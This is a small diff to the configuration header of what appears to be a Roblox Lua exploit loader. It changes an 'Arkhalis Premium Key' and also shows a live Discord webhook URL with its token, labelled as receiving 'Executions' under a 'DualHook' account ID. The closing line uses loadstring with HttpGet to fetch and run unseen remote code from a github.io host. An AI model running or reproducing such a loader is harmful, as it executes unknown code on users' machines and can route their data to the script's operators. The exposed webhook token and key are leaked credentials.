@@ -28,7 +28,7 @@ _G.Tip5 = "" --// Gives You Tips On The UI
 
 _G.DualHookPremiumID = 1962605868 --//DualHook Account ID
 _G.DualHookWebhook = "https://discord.com/api/webhooks/1098448831122780190/SLxgLx966ElnECwXxyvJMFMeMTWoffgNZYs3pgqQlRg4VPx5AN6ujzAHU6B27KnMpz9k" --// Discord link Webhook For Executions
-_G.Key = "ARKHALIS-BLTETEVCXDS" --// Arkhalis Premium Key
+_G.Key = "ARKHALIS-EYBLFUVBADWX" --// Arkhalis Premium Key
 
 --[[ Script ]]--
 loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhaliskeybank.lua"))()
